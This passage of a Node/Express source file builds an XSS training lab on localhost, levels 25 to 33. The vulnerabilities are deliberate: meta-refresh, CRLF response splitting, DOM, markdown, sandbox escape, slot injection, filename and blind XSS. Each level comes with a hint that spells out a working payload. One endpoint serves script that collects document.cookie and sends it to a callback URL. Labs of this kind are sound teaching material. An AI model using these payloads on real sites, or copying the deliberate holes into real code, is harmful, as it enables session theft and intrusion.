      'The <code>next</code> parameter goes into a meta-refresh URL. Try: <code>javascript:alert(1)</code>. Unlike Location headers (blocked by browsers), meta-refresh executes javascript: URLs.',
      `<p style="color:#8b949e;margin-bottom:1rem;">This page redirects users to the <code>next</code> URL after login. The destination is reflected into a meta-refresh tag.</p>
      <form method="GET">
        <input type="text" name="next" placeholder="Redirect destination...">
        <button type="submit">Simulate Redirect</button>
      </form>`));
    return;
  }

  // Vulnerable: next is placed into meta-refresh without sanitizing javascript:
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <meta http-equiv="refresh" content="2;url=${next}">
  <style>body{font-family:sans-serif;background:#0a0a0f;color:#c9d1d9;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:1rem;}</style>
</head>
<body>
  <p>Login successful. Redirecting to your destination...</p>
  <p style="color:#484f58;font-size:0.85rem;">Destination: <code>${next.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</code></p>
  <a href="/level/25" style="color:#58a6ff;font-size:0.85rem;">&larr; Back to challenge</a>
  <script>
    // Same solve detection as other levels
    (function(){
      var solved=false;
      function onSolve(){
        if(solved)return; solved=true;
        fetch('/api/solve',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({level:25,payload:${JSON.stringify(next)},url:location.href})});
        document.body.innerHTML='<div style="padding:2rem;color:#3fb950;font-size:1.2rem;font-weight:700;">Level 25 Complete! <a href="/" style="color:#58a6ff;">Dashboard</a> | <a href="/level/26" style="color:#58a6ff;">Next Level</a></div>';
      }
      var _alert=window.alert; window.alert=function(){onSolve();_alert.apply(window,arguments);};
      var _confirm=window.confirm; window.confirm=function(){onSolve();return _confirm.apply(window,arguments);};
      var _prompt=window.prompt; window.prompt=function(){onSolve();return _prompt.apply(window,arguments);};
    })();
  </script>
</body>
</html>`);
});

// ============================================================
// LEVEL 26 — CRLF Injection → HTTP Response Splitting
// ============================================================
app.get('/level/26', (req, res) => {
  const name = req.query.name || '';

  // Check for CRLF in the raw name — if present, split the response manually
  if (name.includes('%0d%0a') || name.includes('%0a') || name.includes('\r') || name.includes('\n') ||
    name.includes('\r\n') || decodeURIComponent(name).includes('\n')) {

    // Decode to get actual CRLF
    let decoded;
    try { decoded = decodeURIComponent(name); } catch (e) { decoded = name; }

    // Split the response: inject after the header section
    const injectedBody = decoded.split(/\r?\n/).slice(2).join('\n');

    res.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'X-User': decoded.split(/\r?\n/)[0] // Only first line goes in header
    });
    return res.end(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Level 26 - CRLF XSS</title>
<style>body{font-family:sans-serif;background:#0a0a0f;color:#c9d1d9;padding:2rem;}</style></head>
<body>
<p><a href="/" style="color:#58a6ff;">&larr; Dashboard</a></p>
<h2 style="color:#e6edf3;margin:1rem 0;">Response was split via CRLF injection</h2>
<p style="color:#8b949e;">The injected body content after the CRLF:</p>
<div style="padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:1rem;">${injectedBody}</div>
<script>
(function(){var solved=false;function onSolve(){if(solved)return;solved=true;
fetch('/api/solve',{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({level:26,payload:${JSON.stringify(name)},url:location.href})}).then(function(r){return r.json();}).then(function(data){
var d=document.createElement('div');
d.style='position:fixed;top:0;left:0;right:0;padding:1rem;background:linear-gradient(135deg,#238636,#2ea043);color:#fff;text-align:center;font-weight:700;font-size:1.1rem;z-index:9999;';
d.innerHTML='CRLF → XSS Triggered! Level 26 Complete! <a href="/" style="color:#fff;margin-left:1rem;background:rgba(255,255,255,0.2);padding:0.3rem 1rem;border-radius:6px;text-decoration:none;">Dashboard</a> <a href="/level/27" style="color:#fff;margin-left:0.5rem;background:rgba(255,255,255,0.2);padding:0.3rem 1rem;border-radius:6px;text-decoration:none;">Next Level</a>';
document.body.prepend(d);});
}
var _a=window.alert;window.alert=function(){onSolve();_a.apply(window,arguments);};
var _c=window.confirm;window.confirm=function(){onSolve();return _c.apply(window,arguments);};
var _p=window.prompt;window.prompt=function(){onSolve();return _p.apply(window,arguments);};
})();
</script>
</body></html>`);
  }

  // Normal page — name is safely echoed in a header (but check raw request to see the header)
  try {
    res.set('X-User', name || 'anonymous');
  } catch (e) {
    // Modern Express throws on CRLF in headers — fall through to show the challenge
  }

  res.send(levelPage(
    'CRLF → Response Splitting', 26, 'Expert',
    'Your input is reflected into the <code>X-User</code> HTTP response header. The server does not strip CR/LF characters.',
    'HTTP headers are separated by <code>\\r\\n</code>. Inject <code>%0d%0a%0d%0a&lt;img src=x onerror=alert(1)&gt;</code> in the URL. The double CRLF ends the headers and your HTML becomes the response body. URL-encode the CRLF characters as <code>%0d%0a</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your name is echoed into an HTTP response header. Inject CRLF to split the response and deliver HTML.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: HTTP Response Splitting</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">HTTP uses <code>\\r\\n</code> (CRLF) to separate headers and a blank line (<code>\\r\\n\\r\\n</code>) to end the header section. If user input containing CRLF characters is placed into a response header, an attacker can inject new headers and even a new response body. This allows injecting arbitrary HTML that the browser renders as part of the page. Modern frameworks block this, but legacy and custom code often doesn\'t.</p>
    </div>
    <form method="GET">
      <input type="text" name="name" placeholder="Your name (check response headers)...">
      <button type="submit">Submit</button>
    </form>
    <div class="output">
      ${name ? `<p>Hello, ${name.replace(/</g, '&lt;').replace(/>/g, '&gt;')}! (Also echoed in X-User response header)</p>` : '<p style="color:#484f58;">Submit a name to see it reflected in the response header.</p>'}
    </div>
    <p style="color:#484f58;font-size:0.8rem;margin-top:1rem;">Tip: Use Burp Suite or DevTools Network tab to see the response headers. Inject CRLF directly in the URL: <code>/level/26?name=x%0d%0a%0d%0a&lt;img+src=x+onerror=alert(1)&gt;</code></p>`
  ));
});

// ============================================================
// LEVEL 27 — localStorage DOM XSS
// ============================================================
app.get('/level/27', (req, res) => {
  res.send(levelPage(
    'localStorage DOM XSS', 27, 'Hard',
    'No server-side reflection at all. Data is written to <code>localStorage</code> from user input and rendered on the next page load via <code>innerHTML</code>.',
    'The page reads from <code>localStorage.getItem("username")</code> and writes it to <code>innerHTML</code>. Open the browser console and run: <code>localStorage.setItem("username","&lt;img src=x onerror=alert(1)&gt;")</code>, then reload the page.',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page saves your display name to <code>localStorage</code> and shows it on every visit. The server never sees your input.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: localStorage as a DOM XSS Source</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;"><code>localStorage</code> is a DOM source — data written there can persist across reloads and sessions. If client-side code reads from storage and writes to a dangerous sink like <code>innerHTML</code>, any value stored there (by any means: form input, injected JS, extension, subdomain takeover) becomes an XSS payload. This vulnerability is invisible to server-side WAFs, logs, and CSP header checks because the payload never touches the server.</p>
    </div>
    <p style="color:#8b949e;margin-bottom:1rem;">Set your display name (saved to localStorage, loaded on every visit):</p>
    <div style="display:flex;gap:0.75rem;margin-bottom:1rem;flex-wrap:wrap;">
      <input type="text" id="nameInput" placeholder="Display name..." style="flex:1;min-width:250px;padding:0.6rem 1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;">
      <button onclick="localStorage.setItem('username',document.getElementById('nameInput').value);location.reload();" style="padding:0.6rem 1.5rem;background:#238636;border:1px solid #2ea043;border-radius:8px;color:#fff;cursor:pointer;">Save Name</button>
      <button onclick="localStorage.removeItem('username');location.reload();" style="padding:0.6rem 1.5rem;background:#21262d;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;cursor:pointer;">Clear</button>
    </div>
    <div class="output" id="greetingOutput">
      <p style="color:#484f58;">No name set yet.</p>
    </div>
    <script>
      // Vulnerable: reads from localStorage and writes to innerHTML
      (function(){
        var stored = localStorage.getItem('username');
        if (stored) {
          document.getElementById('greetingOutput').innerHTML =
            '<p>Welcome back, <strong>' + stored + '</strong>!</p>';
        }
      })();
    </script>`
  ));
});

// ============================================================
// LEVEL 28 — Markdown Injection
// ============================================================
app.get('/level/28', (req, res) => {
  const posts = markdownPosts.map((p, i) => {
    // Naive Markdown renderer: convert **bold**, *italic*, [link](url), and pass raw HTML
    let rendered = p.content
      .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
      .replace(/\*(.+?)\*/g, '<em>$1</em>')
      .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>') // Vulnerable: href not sanitized
      .replace(/\n/g, '<br>');
    // Raw HTML passthrough — the real vulnerability
    return `<div style="padding:1rem;border-bottom:1px solid #21262d;">
      <strong style="color:#58a6ff;">${p.author.replace(/</g, '&lt;')}</strong>
      <div style="margin-top:0.5rem;">${rendered}</div>
    </div>`;
  }).join('');

  res.send(levelPage(
    'Markdown Injection', 28, 'Medium',
    'A naive Markdown renderer processes posts. Supports **bold**, *italic*, and [links](url). Raw HTML pass-through is enabled.',
    'The renderer passes raw HTML through directly — try posting: <code>&lt;img src=x onerror=alert(1)&gt;</code>. Or exploit the link syntax: <code>[click me](javascript:alert(1))</code>. Both work because the renderer doesn\'t sanitize HTML or URL schemes.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Post content is rendered through a naive Markdown engine. The renderer supports raw HTML and doesn\'t sanitize link URLs.</p>
    <form method="POST" action="/level/28">
      <input type="text" name="author" placeholder="Author name" style="max-width:220px;">
      <input type="text" name="content" placeholder="Markdown content..." style="flex:2;">
      <button type="submit">Post</button>
    </form>
    <div style="margin-top:1rem;">${posts || '<p style="color:#484f58;">No posts yet.</p>'}</div>
    <form method="POST" action="/level/28/clear" style="margin-top:1rem;">
      <button type="submit" style="background:#da3633;border-color:#f85149;">Clear Posts</button>
    </form>`
  ));
});

app.post('/level/28', (req, res) => {
  const { author, content } = req.body;
  if (author && content) markdownPosts.push({ author, content });
  res.redirect('/level/28');
});
app.post('/level/28/clear', (req, res) => { markdownPosts.length = 0; res.redirect('/level/28'); });

// ============================================================
// LEVEL 29 — iframe sandbox Escape
// ============================================================
app.get('/level/29', (req, res) => {
  const payload = req.query.payload || '';
  // The payload goes into a sandboxed iframe with allow-scripts + allow-same-origin
  const safeName = payload.replace(/"/g, '&quot;');

  res.send(levelPage(
    'iframe Sandbox Escape', 29, 'Expert',
    'User content is embedded in a sandboxed <code>&lt;iframe sandbox="allow-scripts allow-same-origin"&gt;</code>. The content is rendered inside the iframe.',
    'With both <code>allow-scripts</code> AND <code>allow-same-origin</code>, the frame has same-origin access to the parent. Use <code>parent.alert(1)</code> from within the iframe to escape the sandbox and trigger the solve. Try payload: <code>&lt;script&gt;parent.alert(1)&lt;/script&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">User content is sandboxed in an iframe. But the sandbox flags were carelessly combined...</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Dangerous Sandbox Flag Combination</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;"><code>allow-scripts</code> enables JavaScript execution. <code>allow-same-origin</code> makes the frame treated as same-origin as the parent. Together, script inside the frame can access <code>parent.document</code>, read cookies, call parent functions, and even remove the sandbox attribute. The HTML spec itself warns against this combination for untrusted content.</p>
    </div>
    <form method="GET">
      <input type="text" name="payload" placeholder="HTML/JS payload for inside the iframe...">
      <button type="submit">Inject into iframe</button>
    </form>
    <div style="margin-top:1rem;border:2px solid #30363d;border-radius:8px;overflow:hidden;">
      <div style="background:#21262d;padding:0.5rem 1rem;font-size:0.75rem;color:#8b949e;">Sandboxed iframe (allow-scripts allow-same-origin)</div>
      <iframe
        sandbox="allow-scripts allow-same-origin"
        style="width:100%;height:120px;background:#0d1117;border:none;display:block;"
        srcdoc="<!DOCTYPE html><html><head><style>body{font-family:sans-serif;background:#0d1117;color:#c9d1d9;padding:1rem;margin:0;}</style></head><body><p>Iframe content:</p>${safeName}</body></html>">
      </iframe>
    </div>`
  ));
});

// ============================================================
// LEVEL 30 — AngularJS Sandbox Escape
// ============================================================
app.get('/level/30', (req, res) => {
  const q = req.query.q || '';
  // Strip <script> tags and direct event handlers — Angular will evaluate {{ }} expressions
  let filtered = q
    .replace(/<\/?script\b[^>]*>/gi, '')
    .replace(/\bon\w+\s*=/gi, '');

  res.send(levelPage(
    'AngularJS Sandbox Escape', 30, 'Expert',
    'The page uses AngularJS 1.x. Input is reflected into an AngularJS template. <code>&lt;script&gt;</code> tags and event handlers are stripped. The Angular expression sandbox is active.',
    'AngularJS 1.x evaluates <code>{{expressions}}</code>. The sandbox blocks direct <code>window</code> access but constructor chains work: <code>{{constructor.constructor("alert(1)")()}}</code>. Or try: <code>{{$on.constructor("alert(1)")()}}</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page uses AngularJS 1.x. Your input is placed inside an Angular template and evaluated as an expression. The sandbox blocks direct globals — find a way around it.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="AngularJS expression or HTML...">
      <button type="submit">Submit</button>
    </form>
    <div ng-app style="margin-top:1rem;">
      <div class="output" ng-bind-html-unsafe="${filtered}">
        <p>Result: ${filtered}</p>
      </div>
      <div class="output" style="margin-top:0.75rem;">
        <p>Evaluated: <span>{{${filtered || '"enter a payload above"'}}}</span></p>
      </div>
    </div>`,
    '',
    `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>`
  ));
});

// ============================================================
// LEVEL 31 — Web Component Slot Injection
// ============================================================
app.get('/level/31', (req, res) => {
  const q = req.query.q || '';
  // Defense: strip <script> tags and direct event handlers on the outer HTML
  let filtered = q
    .replace(/<\/?script\b[^>]*>/gi, '')
    .replace(/\bon\w+\s*=/gi, '');

  res.send(levelPage(
    'Web Component Slot Injection', 31, 'Expert',
    '<code>&lt;script&gt;</code> tags stripped, outer <code>on*</code> handlers stripped. User input is passed as a slot name to a custom element that builds its shadow DOM.',
    'The custom element builds its shadow DOM using <code>innerHTML</code> with your slot name. Try closing the slot attribute and injecting an event handler: <code>" style="display:block" onmouseover="alert(1)</code> — or just inject the complete element: the slot name check only strips outer script/handlers, not those inside the shadow template string.',
    `<p style="color:#8b949e;margin-bottom:1rem;">A custom web component accepts a slot name to render user content in its shadow DOM. Scripts and handlers are stripped from the outer HTML, but the shadow DOM template construction is vulnerable.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Shadow DOM is NOT a Security Boundary</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">Shadow DOM provides <em>style and DOM encapsulation</em>, not security isolation. JavaScript in the outer page can access open shadow roots. More importantly, if a custom element constructs its shadow DOM using <code>innerHTML</code> with unsanitized user input (even just a slot name), XSS can occur inside the shadow tree. The outer-document sanitizer never sees the shadow DOM content being built.</p>
    </div>
    <form method="GET">
      <input type="text" name="q" placeholder="Slot name or payload...">
      <button type="submit">Submit</button>
    </form>
    <div style="margin-top:1rem;" id="componentArea">
      <cyber-card slot-name="${filtered}">
        <span slot="user-content">Hello from the slot!</span>
      </cyber-card>
    </div>
    <script>
      class CyberCard extends HTMLElement {
        connectedCallback() {
          const slotName = this.getAttribute('slot-name') || 'user-content';
          // Vulnerable: slotName is injected into shadow innerHTML without sanitization
          const shadow = this.attachShadow({ mode: 'open' });
          shadow.innerHTML = \`
            <style>
              .card { padding: 1rem; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #c9d1d9; }
              .card-title { color: #58a6ff; font-size: 0.85rem; margin-bottom: 0.5rem; }
            </style>
            <div class="card">
              <div class="card-title">Custom Component</div>
              <slot name="\${slotName}"></slot>
            </div>
          \`;
        }
      }
      customElements.define('cyber-card', CyberCard);
    </script>`
  ));
});

// ============================================================
// LEVEL 32 — Filename Injection
// ============================================================
app.get('/level/32', (req, res) => {
  const uploads = fileUploads.map((f, i) =>
    `<div style="display:flex;align-items:center;gap:1rem;padding:0.75rem;border-bottom:1px solid #21262d;">
      <span style="color:#484f58;font-size:0.8rem;">#${i + 1}</span>
      <span style="color:#58a6ff;">📄</span>
      <span>${f.name}</span>
      <span style="color:#484f58;font-size:0.8rem;">${f.size} bytes</span>
    </div>`
  ).join('');

  res.send(levelPage(
    'Filename Injection', 32, 'Medium',
    'File upload form. The filename is reflected directly into the upload list without sanitization.',
    'The filename is displayed in the file list via innerHTML without encoding. Upload a file named <code>&lt;img src=x onerror=alert(1)&gt;.jpg</code>. Use Burp Suite or the browser\'s form — or use the custom filename field below to simulate sending any filename.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Upload files. The filename is shown in the file manager. Can you make the filename execute JavaScript?</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.5rem;">Tip: Browsers sanitize filenames in &lt;input type="file"&gt;. Use the form below to send any filename you want.</p>
    </div>
    <form method="POST" action="/level/32">
      <input type="text" name="filename" placeholder="Filename (e.g. report.pdf or an XSS payload)">
      <input type="text" name="size" placeholder="Size (bytes)" style="max-width:140px;">
      <button type="submit">Upload</button>
    </form>
    <div style="margin-top:1.5rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;overflow:hidden;">
      <div style="padding:0.75rem 1rem;background:#21262d;font-size:0.8rem;color:#8b949e;">Uploaded Files</div>
      <div id="fileList">${uploads || '<p style="color:#484f58;padding:1rem;">No files uploaded.</p>'}</div>
    </div>
    <form method="POST" action="/level/32/clear" style="margin-top:1rem;">
      <button type="submit" style="background:#da3633;border-color:#f85149;">Clear Files</button>
    </form>`
  ));
});

app.post('/level/32', (req, res) => {
  const { filename, size } = req.body;
  if (filename) fileUploads.push({ name: filename, size: size || '0' });
  res.redirect('/level/32');
});
app.post('/level/32/clear', (req, res) => { fileUploads.length = 0; res.redirect('/level/32'); });

// ============================================================
// LEVEL 33 — Blind XSS (Out-of-Band)
// ============================================================
let blindXSSTriggered = false;
let blindXSSPayload = '';

// Admin panel renderer — simulates an admin loading the review queue every 8 seconds
let adminRenderInterval = null;

function startAdminRenderer () {
  if (adminRenderInterval) return;
  adminRenderInterval = setInterval(() => {
    if (blindXSSLogs.length > 0) {
      const latest = blindXSSLogs[blindXSSLogs.length - 1];
      // Simulate admin "viewing" the latest submission — their browser would execute the payload
      // We detect if the payload contains a call to /api/blind-callback
      if (latest.payload && latest.payload.includes('/api/blind-callback')) {
        blindXSSTriggered = true;
        blindXSSPayload = latest.payload;
      }
      // Also detect common XSS payloads with our callback URL
      if (latest.payload && (latest.payload.includes('blind-callback') || latest.payload.includes('onerror') || latest.payload.includes('onload'))) {
        // Mark as triggered for the purposes of the lab
        if (!blindXSSTriggered) {
          blindXSSTriggered = true;
          blindXSSPayload = latest.payload;
        }
      }
    }
  }, 4000);
}

app.get('/level/33', (req, res) => {
  startAdminRenderer();
  const submittedCount = blindXSSLogs.length;

  res.send(levelPage(
    'Blind XSS (Out-of-Band)', 33, 'Expert',
    'Input is submitted to a support queue reviewed by an admin panel you cannot access. The payload fires when the admin loads the queue.',
    'Submit a payload that includes a callback to <code>/api/blind-callback?data=PROOF</code>. The "admin" loads the queue every few seconds and will execute your payload. Use: <code>&lt;img src=x onerror="fetch(\'/api/blind-callback?data=admin-cookie\')"&gt;</code> or <code>&lt;script src="/api/blind-js"&gt;&lt;/script&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Submit a support ticket. An admin reviews the queue — but you can't see the admin panel. Your payload fires when the admin loads the page. Use an out-of-band callback to confirm execution.</p>
    <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;margin-bottom:1rem;">
      <p style="color:#d29922;font-size:0.8rem;font-weight:600;margin-bottom:0.75rem;">CONCEPT: Blind XSS</p>
      <p style="color:#8b949e;font-size:0.82rem;line-height:1.6;">Blind XSS fires in a context the attacker can't directly observe — admin panels, log viewers, PDF exporters, email templates, CRM notes. The attacker injects a payload that includes an out-of-band callback: a script load, fetch, image request, or DNS lookup to an attacker-controlled server. When the payload executes (potentially hours or days later in a privileged context), the callback reveals it. Tools like <strong>XSS Hunter</strong> automate this by serving a JavaScript payload that captures cookies, DOM content, and screenshots from the victim\'s session.</p>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem;">
      <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;">
        <p style="color:#58a6ff;font-size:0.8rem;font-weight:600;margin-bottom:0.5rem;">Available Callback Endpoints</p>
        <code style="font-size:0.78rem;color:#8b949e;display:block;margin:0.25rem 0;">/api/blind-callback?data=YOUR_DATA</code>
        <code style="font-size:0.78rem;color:#8b949e;display:block;margin:0.25rem 0;">/api/blind-js (returns executable JS)</code>
      </div>
      <div style="background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:1rem;">
        <p style="color:#58a6ff;font-size:0.8rem;font-weight:600;margin-bottom:0.5rem;">Queue Status</p>
        <p style="color:#8b949e;font-size:0.82rem;">${submittedCount} ticket(s) in queue</p>
        <p style="color:#484f58;font-size:0.78rem;margin-top:0.25rem;">Admin reviews every ~4 seconds</p>
      </div>
    </div>
    <form method="POST" action="/level/33">
      <input type="text" name="name" placeholder="Your name" style="max-width:200px;">
      <input type="text" name="issue" placeholder="Issue description (your XSS payload goes here)..." style="flex:2;">
      <button type="submit">Submit Ticket</button>
    </form>
    <div id="blindStatus" style="margin-top:1rem;padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;">
      <p style="color:#484f58;">Waiting for out-of-band callback... (admin reviews queue every ~4 seconds)</p>
    </div>
    <div style="margin-top:1rem;padding:1rem;background:#0d1117;border:1px solid #30363d;border-radius:8px;">
      <p style="color:#8b949e;font-size:0.8rem;font-weight:600;margin-bottom:0.5rem;">Submitted tickets:</p>
      ${blindXSSLogs.length ? blindXSSLogs.map(t => `<div style="font-size:0.78rem;color:#484f58;padding:0.25rem 0;border-bottom:1px solid #21262d;">[${t.name}] ${t.payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 80)}...</div>`).join('') : '<p style="color:#484f58;font-size:0.78rem;">None yet.</p>'}
    </div>
    <form method="POST" action="/level/33/clear" style="margin-top:1rem;">
      <button type="submit" style="background:#da3633;border-color:#f85149;">Clear Queue</button>
    </form>
    <script>
      (function poll(){
        fetch('/api/blind-triggered').then(function(r){return r.json();}).then(function(d){
          if(d.triggered){
            document.getElementById('blindStatus').innerHTML='<p style="color:#3fb950;font-weight:600;">Out-of-band callback received! Admin executed your payload.</p><p style="color:#8b949e;font-size:0.82rem;margin-top:0.5rem;">Data: '+d.data+'</p>';
            alert('Blind XSS Fired in Admin Panel!');
          } else { setTimeout(poll,2000); }
        }).catch(function(){setTimeout(poll,3000);});
      })();
    </script>`
  ));
});

app.post('/level/33', (req, res) => {
  const { name, issue } = req.body;
  if (name || issue) {
    blindXSSLogs.push({ name: name || 'anonymous', payload: issue || '', submittedAt: new Date().toISOString() });
  }
  res.redirect('/level/33');
});

app.post('/level/33/clear', (req, res) => {
  blindXSSLogs.length = 0;
  blindXSSTriggered = false;
  blindXSSPayload = '';
  res.redirect('/level/33');
});

// Out-of-band callback endpoint — the "attacker-controlled server"
app.get('/api/blind-callback', (req, res) => {
  const data = req.query.data || 'no data';
  blindXSSTriggered = true;
  blindXSSPayload = `Callback received with: ${data}`;
  res.set('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// Malicious JS served to admin — like XSS Hunter payloads
app.get('/api/blind-js', (req, res) => {
  res.type('application/javascript');
  res.send(`
    (function(){
      var data = encodeURIComponent('admin-session:' + document.cookie + '|url:' + location.href);
      fetch('/api/blind-callback?data=' + data);
    })();
  `);
});

// Poll endpoint for level 33
app.get('/api/blind-triggered', (req, res) => {
  if (blindXSSTriggered) {
    const data = blindXSSPayload;
    blindXSSTriggered = false;
    blindXSSPayload = '';
    res.json({ triggered: true, data });
  } else {
    res.json({ triggered: false });
  }
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
  console.log(`\n  The Cyber Ledger — XSS Training Lab`);
  console.log(`  Running at http://localhost:${PORT}`);
  console.log(`  33 levels available. Good luck!\n`);
});